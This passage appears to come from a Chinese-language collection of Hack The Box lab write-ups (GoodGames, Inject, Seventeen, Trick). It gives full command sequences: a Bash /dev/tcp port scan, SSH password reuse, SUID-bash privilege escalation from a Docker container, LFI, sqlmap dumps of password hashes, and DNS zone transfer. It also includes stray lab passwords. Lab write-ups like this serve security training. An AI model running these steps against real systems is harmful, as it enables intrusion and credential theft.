0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 0  bytes 0 (0.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 0  bytes 0 (0.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n</code></pre> <p>\u8ba9\u6211\u4eec\u626b\u63cf 172.19.0.1 \u7684\u4e3b\u673a\uff0c\u770b\u770b\u54ea\u4e9b\u7aef\u53e3\u53ef\u7528\uff0c\u4f5c\u4e3a\u6a2a\u5411\u79fb\u52a8\u57fa\u672c\u68c0\u67e5\u7684\u4e00\u90e8\u5206\u3002\u7531\u4e8e\u672a\u5b89\u88c5 nmap\uff0c\u6211\u4eec\u53ef\u4ee5\u6539\u7528 Bash\u3002</p> <pre><code>root@3a453ab39d3d:/backend# for PORT in {0..1000}; do timeout 1 bash -c \"&lt;/dev/tcp/172.19.0.1/$PORT &amp;&gt;/dev/null\" 2&gt;/dev/null &amp;&amp; echo \"port $PORT is open\"; done                                                                    \n&lt;ull\" 2&gt;/dev/null &amp;&amp; echo \"port $PORT is open\"; done\nport 22 is open\nport 80 is open\n</code></pre> <p>\u6211\u4eec\u53d1\u73b0 SSH \u6b63\u5728\u5185\u90e8\u4fa6\u542c\u3002\u6211\u4eec\u5c1d\u8bd5\u5728 root \u548c augustus \u5e10\u6237\u4e0a\u91cd\u590d\u4f7f\u7528\u5bc6\u7801\u3002</p> <pre><code>root@3a453ab39d3d:/backend# script /dev/null bash\nscript /dev/null bash\nScript started, file is /dev/null\n\n# ssh augustus@172.19.0.1\n\n\n</code></pre> <p>\u8fd9\u662f\u6210\u529f\u7684\uff0c\u6211\u4eec\u4ee5 augustus \u7684\u8eab\u4efd\u767b\u5f55\u3002</p> <p>\u77e5\u9053\u7528\u6237\u76ee\u5f55\u5b89\u88c5\u5728Docker\u5bb9\u5668\u4e2d\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728Host\u4e2d\u5199\u5165\u6587\u4ef6\uff0c\u5e76\u4ece\u5bb9\u5668\u4e2d\u5c06\u5176\u6743\u9650\u66f4\u6539\u4e3aroot\u3002\u8fd9\u4e9b\u65b0\u6743\u9650\u4e5f\u5c06\u53cd\u6620\u5230\u4e3b\u673a\u7cfb\u7edf\u3002</p> <p>\u5c06bash\u4f5c\u4e3aaugustus\u590d\u5236\u5230\u7528\u6237\u76ee\u5f55\uff0c\u6211\u4eec\u5df2\u7ecf\u5728\u4e3b\u673a\u4e0a\u8fdb\u884c\u4e86\u8eab\u4efd\u9a8c\u8bc1\uff0c\u7136\u540e\u9000\u51faSSH\u4f1a\u8bdd\u3002\u5728Docker\u5bb9\u5668\u4e2d\u5c06bash\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6240\u6709\u6743\u66f4\u6539\u4e3aroot:root\uff08\u7531root\u548croot\u7ec4\u62e5\u6709\uff09\uff0c\u5e76\u5bf9\u5176\u5e94\u7528SUID\u6743\u9650\u3002</p> <pre><code># As augustus on host machine\naugustus@GoodGames:~$ cp /bin/bash .\ncp /bin/bash .\naugustus@GoodGames:~$ exit\nexit\nlogout\nConnection to 172.19.0.1 closed.\n\n# As root in the docker container\n$ cd /home/augustus\ncd /home/augustus\n$ chown root:root bash\nchown root:root bash\n$ chmod 4755 bash\nchmod 4755 bash\n\n</code></pre> <p>SSH\u8fd4\u56de\u5230\u4e3b\u673a\u4e0a\u7684augustus\u7528\u6237\uff0c\u5e76\u68c0\u67e5bash\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6743\u9650\u3002</p> <pre><code>augustus@GoodGames:~$ ls -la bash\nls -la bash\n-rwsr-xr-x 1 root root 1168776 Oct 31 08:12 bash\n</code></pre> <p>\u6743\u9650\u53cd\u6620\u5728\u4e3b\u673a\u7cfb\u7edf\u4e0a\uff0c\u91cd\u590d\u7684Bash\u73b0\u5728\u5177\u6709SUID\u6743\u9650\u3002\u6267\u884c./bash-p\u5e76\u751f\u6210\u4e00\u4e2a\u6709\u6548UID\u4e3aroot\u7684shell\u3002</p> <pre><code>augustus@GoodGames:~$ ./bash -p\n./bash -p\nbash-5.0# id\nid\nuid=1000(augustus) gid=1000(augustus) euid=0(root) groups=1000(augustus)\nbash-5.0# cd /root/\ncd /root/\nbash-5.0# ls\nls\nroot.txt\n\n</code></pre> <p>https://vnc.htb-cloud.com/index.html?host=proxy-sg.htb-cloud.com%2Fbird%2Fhtb-pxeqhrccqw.htb-cloud.com&amp;password=OyYJSE6l&amp;view_only=true</p>"},{"location":"HTB/HTB-Inject/","title":"Inject","text":""},{"location":"HTB/HTB-Inject/#_1","title":"\u6982\u8ff0","text":""},{"location":"HTB/HTB-Inject/#_2","title":"\u4fe1\u606f\u6536\u96c6","text":""},{"location":"HTB/HTB-Inject/#nmap","title":"Nmap","text":"<pre><code>$ nmap -p- --min-rate=1000 10.129.228.213 \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 09:29 BST\nNmap scan report for 10.129.228.213\nHost is up (0.095s latency).\nNot shown: 61715 filtered tcp ports (no-response), 3818 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n8080/tcp open  http-proxy\n</code></pre> <pre><code>$ nmap -p 22,8080 -sC -sV 10.129.228.213\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 09:33 BST\nNmap scan report for 10.129.228.213\nHost is up (0.0058s latency).\n\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)\n|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)\n|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)\n8080/tcp open  nagios-nsca Nagios NSCA\n|_http-title: Home\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"},{"location":"HTB/HTB-Inject/#8080","title":"8080","text":""},{"location":"HTB/HTB-Inject/#_3","title":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e","text":"<pre><code>http://10.129.228.213:8080/show_image?img=3.jpeg\n</code></pre>"},{"location":"HTB/HTB-Seventeen/","title":"\u8270\u96be\u7684\u673a\u5668 \u8270\u96be\u7684\u5f00\u59cb","text":""},{"location":"HTB/HTB-Seventeen/#synopsis","title":"Synopsis","text":"<p>\u4e00\u5806\u865a\u62df\u4e3b\u673a\uff0c\u90fd\u6dfb\u52a0\u4e86\u4e00\u4e9b\u6700\u7ec8\u7684\u843d\u5730\u6267\u884c\uff0c\u7ad9\u70b9\u4e2d\u6709\u4e00\u4e2a\u57fa\u4e8e\u5e03\u5c14\u503c\u7684SQL\u6ce8\u5165\uff0c\u83b7\u53d6\u5bf9\u6570\u636e\u5e93\u7684\u8bbf\u95ee\u3002\u5176\u4e2d\u4f1a\u6cc4\u6f0f\u53e6\u4e00\u4e2a\u865a\u62df\u4e3b\u673a\u548c\u4ed6\u7684\u6570\u636e\u5e93\uff0c\u65e7\u7ba1\u7406\u7cfb\u7edf\u63d0\u4f9b\u7684\u6587\u4ef6\u4e0a\u4f20\uff0c\u5e76\u6cc4\u6f0f Roundcube \u7f51\u7edc\u90ae\u4ef6\u5b9e\u4f8b\u4e2d\u7684\u4e3b\u673a\u540d\u3002\u4e0a\u4f20\u4e00\u4e2a Webshell \u5e76\u5229\u7528 Roundcube \u4e2d\u7684 CVE-2020-12640 \u6765\u5305\u542b\u5e76\u6267\u884c\u3002\u901a\u8fc7\u6d41\u6c13 NPM \u670d\u52a1\u5668\u5b89\u88c5\u6076\u610f Node \u6a21\u5757\u83b7\u5f97root\u6743\u9650\u4e4b\u524d\uff0c\u5bc6\u7801\u91cd\u7528\u6709\u4e24\u4e2a\u5173\u952e\u70b9\u3002</p>"},{"location":"HTB/HTB-Seventeen/#skills-required","title":"Skills Required","text":"<p>Enumeration SQL injection Source code review</p>"},{"location":"HTB/HTB-Seventeen/#skills-learned","title":"Skills Learned","text":"<p>PHP file inclusion Npm usage Npm registry(Npm\u6ce8\u518c\u8868)</p>"},{"location":"HTB/HTB-Seventeen/#enumeration","title":"Enumeration","text":"<pre><code>$ ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.165 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)\n$ nmap -p$ports -sC -sV 10.10.11.165\n</code></pre> <p>Nmap\u626b\u63cf\u663e\u793a\u4e09\u4e2a\u7aef\u53e3\u5f00\u653e\uff0c22 \u8fd0\u884c SSH \u670d\u52a1\uff0c80 \u548c 8000 \u4e0a\u8fd0\u884c\u4e0d\u540c\u7248\u672c\u7684 Apache \u670d\u52a1\u3002\u7531\u4e8e\u76ee\u524d\u6ca1\u6709 SSH \u51ed\u8bc1\uff0c\u6211\u4eec\u5e94\u8be5\u5206\u522b\u8bbf\u95ee\u5e76\u679a\u4e3e 80, 8000 \u7aef\u53e3\u3002</p>"},{"location":"HTB/HTB-Seventeen/#apache-port-8000","title":"Apache - Port 8000","text":"<p>![[Pasted image 20220925224118.png]]</p>"},{"location":"HTB/HTB-Seventeen/#apache-port-80","title":"Apache - Port 80","text":"<p>\u9759\u6001\u9875\u9762\uff0c\u75db\u8fc7\u722c\u866b\u3001\u76ee\u5f55\u626b\u63cf\u540e\u672a\u53d1\u73b0\u5229\u7528\u70b9\u3002\u4f7f\u7528 <code>ffuf</code> \u626b\u63cf\u5b50\u57df\u540d\uff0c\u53d1\u73b0 <code>exam.seventeen.htb</code> \u3002</p> <pre><code>$ ffuf -H 'Host: FUZZ.seventeen.htb' -u 'http://seventeen.htb' -w /usr/share/seclists/Discovery/Web-Content/raft small-directories-lowercase.txt -fw\n2760\n\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://seventeen.htb\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt\n :: Header           : Host: FUZZ.seventeen.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n :: Filter           : Response words: 2760\n________________________________________________\n\nexam                    [Status: 200, Size: 17375, Words: 3222, Lines: 348, Duration: 51ms]\n:: Progress: [17770/17770] :: Job [1/1] :: 1879 req/sec :: Duration: [0:00:21] :: Errors: 0 ::\n</code></pre> <p>\u5199\u5165\u672c\u5730 <code>hosts</code> \u6587\u4ef6\u89e3\u6790</p> <pre><code>$ echo \"10.10.11.165 exam.seventeen.htb\" | sudo tee -a /etc/hosts\n</code></pre> <p>\u4f7f\u7528 <code>searchsploit</code> \u641c\u7d22 exam \u7cfb\u7edf\u76f8\u5173\u6f0f\u6d1e</p> <pre><code>$ searchsploit exam manager system\n------------------------------------------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                                                              |  Path\n------------------------------------------------------------------------------------------------------------ ---------------------------------\nExam Hall Management System 1.0 - Unrestricted File Upload (Unauthenticated)                                | php/webapps/50103.php\nExam Hall Management System 1.0 - Unrestricted File Upload + RCE (Unauthenticated)                          | php/webapps/50111.py\nExam Reviewer Management System 1.0 - Remote Code Execution (RCE) (Authenticated)                           | php/webapps/50726.txt\nExam Reviewer Management System 1.0 - \u2018id\u2019 SQL Injection                                                    | php/webapps/50725.txt\n------------------------------------------------------------------------------------------------------------ ---------------------------------\nShellcodes: No Results\n</code></pre> <p>\u6ca1\u6709\u51ed\u636e\uff0c\u4f18\u5148\u8003\u8651\u4e0d\u9700\u8981\u8eab\u4efd\u9a8c\u8bc1\u7684\u6f0f\u6d1e\u3002\u67e5\u770b\u5982\u4f55\u80fd\u591f\u5229\u7528SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u6587\u4ef6\u4e2d\u5df2\u5217\u51fapayload\u4fe1\u606f\uff0c\u6ce8\u5165\u70b9\u4e3a\u53c2\u6570 <code>id</code>\u3002</p> <pre><code>$ searchsploit -x /php/webapps/50725.txt\n# Exploit Title: Exam Reviewer Management System 1.0 - &lt;E2&gt;&lt;80&gt;&lt;98&gt;id&lt;E2&gt;&lt;80&gt;&lt;99&gt; SQL Injection\n# Date: 2022-02-18\n\n&lt;SNIP&gt;\n\n*SQLMAP COMMAND*\n*# sqlmap -u \"127.0.0.1/erms/?p=take_exam&amp;id=1\n&lt;http://127.0.0.1/erms/?p=take_exam&amp;id=1&gt;\" -p id --dbs --level 3*\n</code></pre> <p>sqlmap</p> <pre><code>$ sqlmap -u \"http://exam.seventeen.htb/p=take_exam&amp;id=1\" -p id --dbs --level 3 --batch  #\u83b7\u53d6\u5e93\u540d\n&lt;SNIP&gt;\navailable databases [4]:\n[*] db_sfms\n[*] erms_db\n[*] information_schema\n[*] roundcubedb\n\n$ sqlmap -u \"http://exam.seventeen.htb/?p=take_exam&amp;id=1\" -p id --dbs --level 3 --batch - D db_sfms --tables\n\n[3 tables]\n+---------+\n| user    |\n| storage |\n| student |\n+---------+\n\n$ sqlmap -u \"http://exam.seventeen.htb/p=take_exam&amp;id=1\" -p id --dbs --level 3 --batch -D db_sfms -T student --threads=10 --dump\n\nDatabase: db_sfms                                                                                                                            \nTable: student\n[4 entries]\n+---------+----+--------+---------+----------+----------------------------------------------------+-----------+\n| stud_id | yr | gender | stud_no | lastname | password                                           | firstname |\n+---------+----+--------+---------+----------+----------------------------------------------------+-----------+\n| 1       | 1A | Male   | 12345   | Smith    | 1a40620f9a4ed6cb8d81a1d365559233                   | John      |\n| 2       | 2B | Male   | 23347   | Mille    | abb635c915b0cc296e071e8d76e9060c                   | James     |\n| 3       | 2C | Female | 31234   | Shane    | a2afa567b1efdb42d8966353337d9024 (autodestruction) | Kelly     |\n| 4       | 3C | Female | 43347   | Hales    | a1428092eb55781de5eb4fd5e2ceb835                   | Jamie     |\n+---------+----+--------+---------+----------+----------------------------------------------------+-----------+\n</code></pre> <p>\u4e0a\u7ea7\u76ee\u5f55/ver/www \u4e0b\u6587\u4ef6\u5939 oldmanagement \u53ef\u4ee5\u731c\u6d4b\u662f\u5426\u4e3a\u53e6\u4e00\u4e2a\u865a\u62df\u4e3b\u673a</p> <pre><code>$ sqlmap -u \"http://exam.seventeen.htb/p=take_exam&amp;id=1\" -p id --dbs --level 3 --batch -D erms_db -T users --threads=10 --dump\nDatabase: erms_db\nTable: users\n[3 entries]\n+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+\n| id | type | avatar                            | lastname | password                         | username         | firstname    | date_added          | last_login | date_updated        |\n+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+\n| 1  | 1    | ../oldmanagement/files/avatar.png | Admin    | fc8ec7b43523e186a27f46957818391c | admin            | Adminstrator | 2021-01-20 14:02:37 | NULL       | 2022-02-24 22:00:15 |\n| 6  | 2    | ../oldmanagement/files/avatar.png | Anthony  | 48bb86d036bb993dfdcf7fefdc60cc06 | UndetectableMark | Mark         | 2021-09-30 16:34:02 | NULL       | 2022-05-10 08:21:39 |\n| 7  | 2    | ../oldmanagement/files/avatar.png | Smith    | 184fe92824bea12486ae9a56050228ee | Stev1992         | Steven       | 2022-02-22 21:05:07 | NULL       | 2022-02-24 22:00:24 |\n+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+\n\n</code></pre> <pre><code>$ echo '10.129.227.143 oldmanagement.seventeen.htb' | sudo tee -a /etc/hosts\n</code></pre> <p>\u83b7\u53d6\u4e00\u4e2a\u767b\u9646\u9875\u9762\uff0c\u4f7f\u7528\u5b66\u53f7\u2795\u5bc6\u7801\u767b\u9646\uff0c\u524d\u9762sqlmap\u8dd1\u51fa\u6765\u7684\u5bc6\u7801\u53ef\u4ee5\u767b\u9646\u3002 ![[Pasted image 20220929163252.png]] \u6709\u4e00\u53ef\u4ee5\u4e0b\u8f7d\u7684pdf\u548c\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\uff0c\u67e5\u770bpdf\u6587\u4ef6\uff0c\u5f97\u5230mastermailer.seventeen.htb\u865a\u62df\u4e3b\u673a ![[Pasted image 20220929163718.png]]</p> <pre><code>$ echo '10.129.119.55 mastermailer.seventeen.htb' | sudo tee -a /etc/hosts\n</code></pre> <p>IP: 10.129.119.55 parrot: htb-ovuln@htb-q8thfpvb4i.htb-cloud.com 7R6iTapk</p>"},{"location":"HTB/HTB-Seventeen/#_2","title":"\u9898\u89e3","text":""},{"location":"HTB/HTB-Seventeen/#_3","title":"\u505a\u9898\u8fc7\u7a0b","text":""},{"location":"HTB/HTB-Tirck/","title":"HTB Tirck","text":""},{"location":"HTB/HTB-Tirck/#_1","title":"\u8bf4\u660e","text":"<p>Trick \u662f\u4e00\u6b3e Easy Linux \u673a\u5668\uff0c\u5177\u6709 DNS \u670d\u52a1\u5668\u548c\u591a\u4e2a vHost\uff0c\u6240\u6709\u8fd9\u4e9b\u90fd\u9700\u8981\u5404\u79cd\u6b65\u9aa4\u624d\u80fd\u83b7\u5f97\u7acb\u8db3\u70b9\u3002\u5b83\u9700\u8981 DNS \u7684\u57fa\u672c\u77e5\u8bc6\u624d\u80fd\u83b7\u5f97\u57df\u540d\uff0c\u7136\u540e\u83b7\u5f97\u53ef\u7528\u4e8e\u8bbf\u95ee\u7b2c\u4e00\u4e2a vHost \u7684\u5b50\u57df\u3002\u5728\u7b2c\u4e00\u4e2a vHost \u4e0a\uff0c\u6211\u4eec\u770b\u5230\u4e86\u4e00\u4e2a\u5bb9\u6613\u53d7\u5230 SQL \u6ce8\u5165\u653b\u51fb\u7684\u5de5\u8d44\u7ba1\u7406\u7cfb\u7edf\u3002\u4f7f\u7528 sqlmap \u6211\u4eec\u53d1\u73b0\u6211\u4eec\u6709\u6587\u4ef6\u6743\u9650\u5e76\u4e14\u53ef\u4ee5\u8bfb\u53d6\u7cfb\u7edf\u6587\u4ef6\u3002\u8bfb\u53d6 Nginx \u914d\u7f6e\u6587\u4ef6\u4f1a\u663e\u793a\u53e6\u4e00\u4e2a vHost\u3002\u6b64 vHost \u5305\u542b\u4e00\u4e2a\u53ef\u88ab\u5229\u7528\u7684\u672c\u5730\u6587\u4ef6\u5305\u542b (LFI) \u6f0f\u6d1e\u3002\u5411\u5176\u4e2d\u4e00\u4e2a\u5d4c\u5165\u4e86 PHP \u4ee3\u7801\u7684\u7528\u6237\u53d1\u9001\u90ae\u4ef6\uff0c\u7136\u540e\u5c06\u8be5\u90ae\u4ef6\u5305\u542b\u5728 LFI \u4e2d\uff0c\u53ef\u4ee5\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c (RCE)\u3002\u5728\u6700\u521d\u7684\u7acb\u8db3\u70b9\u4e4b\u540e\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e2a\u65e0\u9700\u5bc6\u7801\u5373\u53ef\u6267\u884c\u7684 Sudo \u547d\u4ee4\u3002\u8be5\u547d\u4ee4\u91cd\u65b0\u542f\u52a8 fail2ban \u670d\u52a1\u3002 fail2ban \u7684\u914d\u7f6e\u76ee\u5f55\u5305\u542b\u4e00\u4e2a\u7531\u5f53\u524d\u7528\u6237\u6240\u5c5e\u7684\u7ec4\u62e5\u6709\u7684\u76ee\u5f55\u3002\u7528\u6237\u5bf9\u8be5\u76ee\u5f55\u5177\u6709\u5199\u5165\u6743\u9650\uff0c\u5e76\u4e14\u53ef\u4ee5\u91cd\u547d\u540d\u914d\u7f6e\u6587\u4ef6\u5e76\u5c06\u5176\u66ff\u6362\u4e3a\u81ea\u5df1\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u4e00\u65e6\u89e6\u53d1\u7981\u4ee4\uff0c\u5c31\u4f1a\u4ee5 root \u8eab\u4efd\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u3002</p>"},{"location":"HTB/HTB-Tirck/#_2","title":"\u6240\u9700\u6280\u80fd","text":"<p>\u57fa\u672c DNS \u77e5\u8bc6  \u679a\u4e3e</p>"},{"location":"HTB/HTB-Tirck/#_3","title":"\u5b66\u4e60\u6280\u80fd","text":"<p>[[DNS\u533a\u57df\u4f20\u9001(DNS Zone Transfer) | DNS\u533a\u57df\u4f20\u9001]] \u4f7f\u7528 SQL \u6ce8\u5165\u8bfb\u53d6\u7cfb\u7edf\u6587\u4ef6  \u6587\u4ef6\u6743\u9650\u914d\u7f6e\u9519\u8bef\u7684\u5229\u7528</p>"},{"location":"HTB/HTB-Tirck/#enumeration","title":"Enumeration","text":""},{"location":"HTB/HTB-Tirck/#nmap","title":"Nmap","text":"<p>\u8ba9\u6211\u4eec\u4ece\u4f7f\u7528 Nmap \u626b\u63cf\u5f00\u653e\u7aef\u53e3\u5f00\u59cb\u3002</p> <pre><code>$ ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.166 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) \n$ nmap -p$ports -sC -sV 10.10.11.166\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)\n|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)\n|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)\n25/tcp open  smtp?\n|_smtp-commands: Couldn't establish connection on port 25\n53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)\n| dns-nsid: \n|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian\n80/tcp open  http    nginx 1.14.2\n|_http-title: Coming Soon - Start Bootstrap Theme\n|_http-server-header: nginx/1.14.2\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <p>Nmap \u626b\u63cf\u663e\u793a\u7aef\u53e3 22 (SSH)\u300125 (SMTP)\u300153 (ISC) \u548c 80 (Nginx) \u5df2\u6253\u5f00\u3002</p>"},{"location":"HTB/HTB-Tirck/#nginx","title":"Nginx","text":"<p>\u8ba9\u6211\u4eec\u7528\u6d4f\u89c8\u5668\u5bfc\u822a\u5230 80 \u7aef\u53e3\u6765\u770b\u770b\u8fd9\u4e2a\u7f51\u7ad9\u3002 ![[Pasted image 20221103201300.png]] \u7aef\u53e3 80 \u5305\u542b\u4e00\u4e2a\u5f53\u524d\u6b63\u5728\u6784\u5efa\u7684\u9875\u9762\uff0c\u5e76\u58f0\u660e\u201c\u8be5\u7f51\u7ad9\u5373\u5c06\u63a8\u51fa\u201d\u3002\u6ca1\u6709\u5176\u4ed6\u611f\u5174\u8da3\u7684\u4e1c\u897f\u53ef\u4ee5\u7acb\u5373\u627e\u5230\u3002\u8ba9\u6211\u4eec\u7ee7\u7eed\u679a\u4e3e\u7aef\u53e3 53 \u4e0a\u7684 DNS \u670d\u52a1\u5668\u3002</p>"},{"location":"HTB/HTB-Tirck/#dns","title":"DNS","text":"<p>DNS \u662f\u5c06 google.com \u7b49\u57df\u540d\u8f6c\u6362\u4e3a IP \u5730\u5740\u7684\u5de5\u5177\uff0c\u4f46\u662f\uff0cDNS \u4e5f\u53ef\u7528\u4e8e\u67e5\u627e\u5c5e\u4e8e IP \u5730\u5740\u7684\u57df\u540d\u3002\u4f7f\u7528 dig \u6211\u4eec\u53ef\u4ee5\u6267\u884c\u53cd\u5411\u67e5\u627e\u5e76\u5c1d\u8bd5\u4ece DNS \u670d\u52a1\u5668\u83b7\u53d6\u57df\u540d\u3002</p> <pre><code>$ dig @10.10.11.166 -x 10.10.11.166\n; &lt;&lt;&gt;&gt; DiG 9.16.27-Debian &lt;&lt;&gt;&gt; @10.129.227.180 -x 10.129.227.180\n; (1 server found)\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 2278\n;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3\n;; WARNING: recursion requested but not available\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n; COOKIE: 336fe724da57c90cd0764ae36363bc255dab9c805370b42b (good)\n;; QUESTION SECTION:\n;180.227.129.10.in-addr.arpa.   IN      PTR\n\n;; ANSWER SECTION:\n180.227.129.10.in-addr.arpa. 604800 IN  PTR     trick.htb.\n\n;; AUTHORITY SECTION:\n227.129.10.in-addr.arpa. 604800 IN      NS      trick.htb.\n\n;; ADDITIONAL SECTION:\ntrick.htb.              604800  IN      A       127.0.0.1\ntrick.htb.              604800  IN      AAAA    ::1\n\n;; Query time: 6 msec\n;; SERVER: 10.129.227.180#53(10.129.227.180)\n;; WHEN: Thu Nov 03 13:03:30 GMT 2022\n;; MSG SIZE  rcvd: 165\n</code></pre> <p>dig \u7684\u8f93\u51fa\u663e\u793a\u57df trick.htb \u3002\u8ba9\u6211\u4eec\u5c06\u5b83\u6dfb\u52a0\u5230\u6211\u4eec\u7684\u4e3b\u673a\u6587\u4ef6\u4e2d</p> <pre><code>$ echo $target 'trick.htb' | sudo tee -a /etc/hosts\n</code></pre> <p>\u5bfc\u822a\u5230 http://trick.htb \u4f3c\u4e4e\u7ed9\u4e86\u6211\u4eec\u548c\u4ee5\u524d\u4e00\u6837\u7684\u9875\u9762\u3002\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u53d1\u8d77\u4e00\u4e2a\u533a\u57df\u8f6c\u79fb\uff0c\u5e76\u5c1d\u8bd5\u83b7\u53d6\u4e0e trick.htb \u5173\u8054\u7684\u5176\u4ed6\u57df\u540d\u3002</p> <p>DNS \u5206\u4e3a\u8bb8\u591a\u4e0d\u540c\u7684\u533a\u57df\uff0c\u533a\u57df\u662f\u57df\u540d\u7a7a\u95f4\u7684\u4e00\u90e8\u5206\uff0c\u7531 DNS \u670d\u52a1\u5668\u6258\u7ba1\u548c\u670d\u52a1\u3002\u4f8b\u5982\uff0cexample.com \u548c\u5b83\u53ef\u80fd\u62e5\u6709\u7684\u6240\u6709\u5b50\u57df\uff08\u4f8b\u5982 subdomain.example.com \uff09\u90fd\u662f\u4e00\u4e2a\u533a\u57df\u3002\u533a\u57df\u4f20\u8f93\u662f\u590d\u5236\u6574\u4e2a\u533a\u57df\u7684\u8bf7\u6c42</p> <pre><code>$ dig @$target axfr trick.htb\n; &lt;&lt;&gt;&gt; DiG 9.16.27-Debian &lt;&lt;&gt;&gt; @10.129.227.180 axfr trick.htb\n; (1 server found)\n;; global options: +cmd\ntrick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800\ntrick.htb.              604800  IN      NS      trick.htb.\ntrick.htb.              604800  IN      A       127.0.0.1\ntrick.htb.              604800  IN      AAAA    ::1\npreprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.\ntrick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800\n;; Query time: 6 msec\n;; SERVER: 10.129.227.180#53(10.129.227.180)\n;; WHEN: Thu Nov 03 13:07:47 GMT 2022\n;; XFR size: 6 records (messages 1, bytes 231)\n</code></pre> <p>\u8f93\u51fa\u663e\u793a\u4e00\u4e2a\u540d\u4e3a <code>preprod-payroll.trick.htb</code> \u7684\u65b0\u57df\u540d\u3002\u8ba9\u6211\u4eec\u4e5f\u5c06\u5b83\u6dfb\u52a0\u5230\u6211\u4eec\u7684\u4e3b\u673a\u6587\u4ef6\u4e2d\uff0c\u5e76\u5728\u6211\u4eec\u7684\u6d4f\u89c8\u5668\u4e2d\u8bbf\u95ee\u65b0\u4e3b\u673a\u3002 ![[Pasted image 20221103211235.png]]</p> <p>\u4e3b\u673a\u540d\u8fd4\u56de\u4e00\u4e2a\u5177\u6709\u767b\u5f55\u9762\u677f\u7684\u65b0\u7f51\u7ad9\u3002</p>"},{"location":"HTB/HTB-Tirck/#payroll-system","title":"Payroll system","text":"<p>\u67e5\u770b HTML \u6e90\u4ee3\u7801\uff0c\u6211\u4eec\u770b\u5230\u9875\u9762\u7684\u6807\u9898\u662f Employee's Payroll Management System \u3002</p> <p>![[Pasted image 20221103211510.png]] \u4f7f\u7528\u5173\u952e\u5b57\u5458\u5de5\u5de5\u8d44\u7ba1\u7406\u7cfb\u7edf\u6f0f\u6d1e\u8fdb\u884c\u5feb\u901f\u8c37\u6b4c\u641c\u7d22\u8868\u660e\u8be5\u7279\u5b9a\u8f6f\u4ef6\u6613\u53d7 SQL \u6ce8\u5165\u653b\u51fb\u3002\u5728\u94fe\u63a5\u4e2d\uff0c\u6211\u4eec\u770b\u5230\u6f0f\u6d1e\u5b58\u5728\u4e8e\u767b\u5f55\u9875\u9762\u4e2d\uff0c\u7279\u522b\u662f\u5728\u7528\u6237\u540d\u53c2\u6570\u4e2d\u3002</p> <p>\u8ba9\u6211\u4eec\u542f\u52a8 sqlmap \u6765\u5c1d\u8bd5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u3002</p> <pre><code>$ sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login -- data=\"username=abc&amp;password=abc\" -p username --batch\n</code></pre> <p>sqlmap \u8f93\u51fa\u663e\u793a\u8be5\u9875\u9762\u786e\u5b9e\u5bb9\u6613\u53d7\u5230\u57fa\u4e8e\u65f6\u95f4\u7684 SQL 